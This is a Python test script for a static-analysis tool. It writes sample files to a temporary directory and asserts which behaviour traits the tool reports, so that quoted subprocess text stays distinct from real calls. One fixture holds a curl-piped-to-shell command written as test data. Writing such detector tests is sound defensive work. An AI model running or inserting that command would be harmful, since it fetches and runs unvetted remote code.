#!/usr/bin/env python3
"""Keep process-call text distinct from a parsed subprocess invocation."""
import argparse
import json
from pathlib import Path
import subprocess
import tempfile

repo = Path(__file__).resolve().parents[2]
parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument('--cleave', default='../cleave/target/release/cleave')
args = parser.parse_args()
with tempfile.TemporaryDirectory(prefix='process-evidence-') as tmp:
    root = Path(tmp)
    cases = {
        'example.py': "description = \"subprocess.check_call(['whoami'])\"\n",
        'actual.py': "import subprocess\nsubprocess.check_call(['whoami'])\n",
        'download.py': "import os\nos.system('curl https://example.org/a | sh')\n",
        'no-pipeline.py': "import os\nos.system('curl https://example.org/a')\n",
    }
    for name, source in cases.items():
        (root / name).write_text(source)
    result = subprocess.run(
        [str((repo / args.cleave).resolve()), '--traits-dir', str(repo), '--min-crit', 'component',
         '--format=json', *(str(root / name) for name in cases)],
        check=True, capture_output=True, text=True,
    )
    reports = [json.loads(line)['files'][0] for line in result.stdout.splitlines() if line]
    ids = {Path(r['path']).name: {t['id'] for t in r.get('traits', [])} for r in reports}
    text = 'metadata/file/profile/command-reference::python-subprocess-check-call-text'
    launch = 'micro-behaviors/process/create/subprocess/launch::process-execution'
    assert text in ids['example.py'], ids['example.py']
    assert launch not in ids['example.py'], ids['example.py']
    parsed = 'micro-behaviors/process/create/subprocess/launch::check-call-ast'
    assert parsed not in ids['example.py']
    assert parsed in ids['actual.py'], ids['actual.py']
    pipeline = 'micro-behaviors/process/create/shell/pipeline::python-curl-pipe-shell-call'
    assert pipeline in ids['download.py'] and pipeline not in ids['no-pipeline.py'], ids
    print('Call-shaped text remains distinct from a parsed subprocess launch.')
